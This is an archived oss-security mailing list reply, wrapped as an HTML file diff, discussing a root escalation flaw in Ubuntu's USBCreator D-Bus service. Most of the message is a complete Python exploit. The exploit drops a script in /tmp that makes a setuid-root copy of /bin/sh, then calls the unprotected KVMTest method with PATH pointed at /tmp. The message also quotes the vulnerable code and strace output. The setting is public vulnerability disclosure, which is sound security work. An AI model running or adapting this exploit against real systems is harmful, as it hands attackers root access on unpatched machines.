@@ -1,0 +1,287 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: USBCreator D-Bus service</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="4">[&lt;prev]</a> <a href="../../../2015/04/25/1">[next&gt;]</a> <a href="../../../2015/04/23/13">[&lt;thread-prev]</a> <a href="../../../2015/05/04/3">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;CANtF8NBXucaUqa8=xRZDt4jV2T56=CXs20T2W5FciatmLXPHvQ&#64;mail.gmail.com&gt;
+Date: Fri, 24 Apr 2015 17:04:51 -0500
+From: Grandma Eubanks &lt;tborland1&#64;...il.com&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: Re: USBCreator D-Bus service
+
+So, the reason there's problems in people's VM testing may be due to their
+configuration for memory usage. Also, without qemu-kvm (or kvm command in
+search path), it won't call KVM and has a limited search path that does not
+include CWD and our own controlled envp won't get triggered until kvm is
+found. If we can control an arbitrary file creation bug (apport?),
+ld_preload would be the way to go as shown in tavis's poc.
+
+# By TurboBorland
+# Sometimes, to interact with dbus over remtoe console, you'll need:
+# export DISPLAY=:0
+import dbus
+from os import chmod,unlink
+
+def
+test_dbus(bus_type,bus_name,path,interface,object_method_name,*argument):
+    bus = dbus.SystemBus()
+
+
+print("bus_type:\t%s\nbus_name:\t%s\npath:\t\t%s\ninterface:\t%s\nmethod:\t\t%s\nargument:\t%s\n"
+% (bus_type,bus_name,path,interface,object_method_name,argument))
+    bus_object = bus.get_object(bus_name,path)
+    object_method = bus_object.get_dbus_method(object_method_name,interface)
+    object_method(*argument)
+
+
+def check_req():
+    f = open("/proc/meminfo","r")
+    free = 0
+    for line in f:
+        if (line.find("MemFree") != -1):
+            memfree = (int(line.split(":")[1][:-3])/1024)
+            #print(str(memfree))
+        elif (line.find("Buffers") != -1):
+            buffers = (int(line.split(":")[1][:-3])/1024)
+            memfree += buffers
+            #print(str(memfree))
+    if (memfree &lt; 768):    exit("Not enough memory to pass mem_free()
+condition")
+
+def drop_bomb():
+    try:    f = open("/usr/bin/kvm","r")
+    except IOError as e:    exit("KVM does not exist in /usr/bin/kvm. Wrong
+directory or not installed?\n%s" % e)
+    for line in f:
+        if (line.find("exec") != -1):
+            dropfile = "/tmp/" + line.split(" ")[1]
+
+    f = open(dropfile,"w")
+    f.write("#!/bin/sh\n/bin/cp /bin/sh /tmp/shell\n/bin/chown root:root
+/tmp/shell\n/bin/chmod 04755 /tmp/shell")
+    f.close()
+
+    # sigh, tried so hard to stay away from having to do anything with os
+import
+    # if anyone knows how to set +x without this, I would love you long time
+    chmod(dropfile,755)
+    return dropfile
+
+def trigger_vuln(dropfile):
+    device = "/dev/sda"
+    # make sure /tmp is not nosuid, or choose somewhere else
+    env = {"DISPLAY": ":0","XAUTHORITY": "a", "PATH": "/tmp"}
+    args = (device,env)
+
+    # introspect, enable to see commands and arguments for USBCreator
+
+#test_dbus("system","com.ubuntu.USBCreator","/com/ubuntu/USBCreator","org.freedesktop.DBus.Introspectable","Introspect","")
+
+test_dbus("system","com.ubuntu.USBCreator","/com/ubuntu/USBCreator","com.ubuntu.USBCreator","KVMTest",*args)
+    unlink(str(dropfile))
+
+if __name__ == '__main__':
+#    check_req()
+    print("Requirements passed")
+    dropfile = drop_bomb()
+    print("The setup is ready")
+    trigger_vuln(dropfile)
+    exit("shell dropped in /tmp/shell")
+
+
+'''
+vuln code (lack of check_polkit here and kvm-lk):
+
+    @dbus.service.method(USBCREATOR_IFACE, in_signature='sa{ss}',
+out_signature='')
+    def KVMTest(self, device, env):
+        #Run KVM with the freshly created device as the first disk.
+        for key in ('DISPLAY', 'XAUTHORITY'):
+            if key not in env:
+                logging.debug('Missing %s' % key)
+                return
+        udisks = UDisks.Client.new_sync(None)
+        obj = _get_parent_object(udisks, device)
+        # TODO unmount all the partitions.
+        dev_file =
+obj.get_block().get_cached_property('Device').get_bytestring().decode('utf-8')
+        if mem_free() &gt;= 768:
+            envp = []
+            for k, v in env.items():
+                envp.append('%s=%s' % (str(k), str(v)))
+            cmd = ('kvm', '-m', '512', '-hda', str(dev_file))
+            flags = (GObject.SPAWN_SEARCH_PATH)
+            # Don't let SIGINT propagate to the child.
+            GObject.spawn_async(cmd, envp=envp, flags=flags,
+child_setup=os.setsid)
+'''
+
+'''
+SPAWN_SEARCH_PATH (can we get around this to break the kvm binary
+requirement?):
+15071 execve("/usr/sbin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
+["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
+directory)
+15071 execve("/usr/bin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
+["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
+directory)
+15071 execve("/sbin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
+["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
+directory)
+15071 execve("/bin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
+["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
+directory)
+'''
+
+I'm sure there's better ways to do some of this, and there's a few comments
+you can uncomment to help you figure other things out.
+
+On Thu, Apr 23, 2015 at 1:22 AM, Kurt Seifried &lt;kseifried&#64;...hat.com&gt; wrote:
+
+&gt; On 04/22/2015 07:49 PM, Solar Designer wrote:
+&gt; &gt; On Wed, Apr 22, 2015 at 05:50:35PM -0700, Tavis Ormandy wrote:
+&gt; &gt;&gt; On Wednesday, April 22, 2015, Seth Arnold &lt;seth.arnold&#64;...onical.com&gt;
+&gt; wrote:
+&gt; &gt;&gt;&gt; We treat local root escalation vulnerabilities with a high priority[1].
+&gt; &gt;&gt;
+&gt; &gt;&gt; I wish you had spoken up during the previous discussion. It was my
+&gt; &gt;&gt; impression that embargoes for local privilege escalations were
+&gt; universally
+&gt; &gt;&gt; considered deprecated.
+&gt; &gt;
+&gt; &gt; I think Kurt's comment (in the linux-distros discussion) on not needing
+&gt; &gt; further vulnerability reports embargoed applied solely to ABRT.
+&gt; &gt;
+&gt; &gt; I can see how this can appear as extending to any local root issues, for
+&gt; &gt; users who have ABRT installed and enabled.
+&gt; &gt;
+&gt; &gt; Kurt might want to clarify this.
+&gt; &gt;
+&gt; &gt; Alexander
+&gt;
+&gt; Clarification won't be possible for a bit, I'm actually meeting with
+&gt; Tavis tomorrow to discuss this and other things (this was scheduled some
+&gt; time ago, it seems I was right in assuming this would become a bigger
+&gt; issue =).
+&gt;
+&gt;
+&gt; --
+&gt; Kurt Seifried -- Red Hat -- Product Security -- Cloud
+&gt; PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+&gt;
+&gt;
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
